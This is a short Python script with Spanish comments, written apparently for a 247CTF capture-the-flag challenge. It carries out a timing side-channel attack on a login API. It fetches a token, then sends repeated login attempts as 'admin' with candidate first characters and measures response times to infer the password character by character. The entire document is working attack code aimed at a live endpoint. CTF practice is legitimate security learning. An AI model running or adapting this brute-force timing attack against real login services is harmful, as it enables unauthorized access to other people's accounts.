#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Hacer múltiples mediciones para 3 caracteres diferentes
api_token = get_token()
print(f"[+] Token: {api_token}\n")

test_chars = ['0', '6', 'a']  # Probar los 3 más lentos de la prueba anterior
num_measurements = 10

for char in test_chars:
    times = []
    test_password = char + "0" * 31
    
    for i in range(num_measurements):
        result, elapsed = try_password("admin", test_password, api_token)
        times.append(elapsed)
    
    avg = statistics.mean(times)
    stdev = statistics.stdev(times) if len(times) > 1 else 0
    print(f"Carácter '{char}':")
    print(f"  Promedio: {avg:.4f}s")
    print(f"  Desv. Est: {stdev:.4f}s")
    print(f"  Min: {min(times):.4f}s, Max: {max(times):.4f}s")
    print(f"  Tiempos: {[f'{t:.4f}' for t in times]}")
    print()
